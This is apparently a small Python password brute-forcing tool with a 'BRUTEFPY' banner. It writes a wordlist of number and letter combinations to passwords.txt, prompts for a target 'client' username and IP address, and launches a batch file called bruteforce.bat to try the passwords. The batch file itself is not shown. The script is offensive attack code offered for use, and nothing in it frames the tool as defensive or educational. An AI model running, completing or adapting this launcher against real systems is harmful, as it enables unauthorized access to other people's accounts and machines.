import time
import os
from passwordgen import get_number_letter_combinations, get_numbers, generate_letter_combinations

title ='''

██████╗░██████╗░██╗░░░██╗████████╗███████╗██████╗░██╗░░░██╗
██╔══██╗██╔══██╗██║░░░██║╚══██╔══╝██╔════╝██╔══██╗╚██╗░██╔╝
██████╦╝██████╔╝██║░░░██║░░░██║░░░█████╗░░██████╔╝░╚████╔╝░
██╔══██╗██╔══██╗██║░░░██║░░░██║░░░██╔══╝░░██╔═══╝░░░╚██╔╝░░
██████╦╝██║░░██║╚██████╔╝░░░██║░░░███████╗██║░░░░░░░░██║░░░
╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░░░░░░░╚═╝░░░
'''


def brute_force():
    while True:
        q1 = input("Would you like to start brute-forcing? (y/n): ").lower()
        if q1 in ["y", "yes"]:
            break
        elif q1 in ["n", "no"]:
            print("Clearing password list and exiting...")
            with open("passwords.txt", "w") as file:
                file.write("")  # Clear the file content
            time.sleep(2)
            return
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

    user = input("Enter Client's Username: ")
    ipaddr = input("Enter Client's IP Address: ")

    # Save username and IP address to files
    with open("user.txt", "w") as userFile:
        userFile.write(user)
    with open("ipaddr.txt", "w") as ipaddrFile:
        ipaddrFile.write(ipaddr)

    # Execute the brute force script
    os.system("bruteforce.bat")

def password_list_generator(max_range):
    max_range = int(max_range)
    with open("passwords.txt", "w") as file:
        # Write various password combinations to the file
        file.write(get_numbers(max_range))
        file.write(get_number_letter_combinations(max_range))
        for combination in generate_letter_combinations(max_range):
            file.write(combination + '\n')

    # Initiate the brute force process
    brute_force()

def main():
    max_range = input("Enter the Max Number in Range: ")
    password_list_generator(max_range)

if __name__ == "__main__":
    os.system("color a")
    print(title)
    main()
